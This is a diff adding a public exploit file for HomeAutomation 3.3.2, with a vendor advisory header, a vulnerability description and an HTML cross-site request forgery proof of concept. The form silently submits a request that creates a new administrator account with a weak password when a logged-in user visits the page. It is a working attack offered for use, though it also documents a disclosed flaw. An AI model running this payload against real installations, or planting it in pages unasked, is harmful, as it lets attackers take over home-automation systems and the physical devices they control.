@@ -1,0 +1,68 @@
+# Exploit: HomeAutomation 3.3.2 - Cross-Site Request Forgery (Add Admin)
+# Date: 2019-12-30
+# Author: LiquidWorm
+# Vendor: Tom Rosenback and Daniel Malmgren
+# Product web page: http://karpero.mine.nu/ha/
+# Affected version: 3.3.2
+# Tested on: Apache/2.4.41 (centos) OpenSSL/1.0.2k-fips
+# Advisory ID: ZSL-2019-5558
+# Advisory URL: https://www.zeroscience.mk/en/vulnerabilities/ZSL-2019-5558.php
+
+
+HomeAutomation v3.3.2 CSRF Add Admin Exploit
+
+
+Vendor: Tom Rosenback and Daniel Malmgren
+Product web page: http://karpero.mine.nu/ha/
+Affected version: 3.3.2
+
+Summary: HomeAutomation is an open-source web interface and scheduling solution.
+It was initially made for use with the Telldus TellStick, but is now based on a
+plugin system and except for Tellstick it also comes with support for Crestron,
+OWFS and Z-Wave (using OpenZWave). It controls your devices (switches, dimmers,
+etc.) based on an advanced scheduling system, taking into account things like
+measurements from various sensors. With the houseplan view you can get a simple
+overview of the status of your devices at their location in your house.
+
+Desc: The application interface allows users to perform certain actions via HTTP
+requests without performing any validity checks to verify the requests. This can
+be exploited to perform certain actions with administrative privileges if a logged-in
+user visits a malicious web site.
+
+Tested on: Apache/2.4.41 (centos) OpenSSL/1.0.2k-fips
+           Apache/2.4.29 (Ubuntu)
+           PHP/7.4.0RC4
+           PHP/7.3.11
+           PHP 7.2.24-0ubuntu0.18.04.1
+
+
+Vulnerability discovered by Gjoko 'LiquidWorm' Krstic
+                            @zeroscience
+
+
+Advisory ID: ZSL-2019-5558
+Advisory URL: https://www.zeroscience.mk/en/vulnerabilities/ZSL-2019-5558.php
+
+
+06.11.2019
+
+--
+
+
+<html>
+  <body>
+    <form action="http://localhost/homeautomation_v3_3_2/?page=conf-usercontrol" method="POST">
+      <input type="hidden" name="id" value="-1" />
+      <input type="hidden" name="action" value="save" />
+      <input type="hidden" name="editable" value="2" />
+      <input type="hidden" name="username" value="testingus" />
+      <input type="hidden" name="password" value="123456" />
+      <input type="hidden" name="firstname" value="Tester" />
+      <input type="hidden" name="lastname" value="Testovski" />
+      <input type="hidden" name="email" value="test@zeroscience.mk" />
+      <input type="hidden" name="userlevel" value="3" />
+      <input type="hidden" name="save" value="Save" />
+      <input type="submit" value="Addmoi" />
+    </form>
+  </body>
+</html>
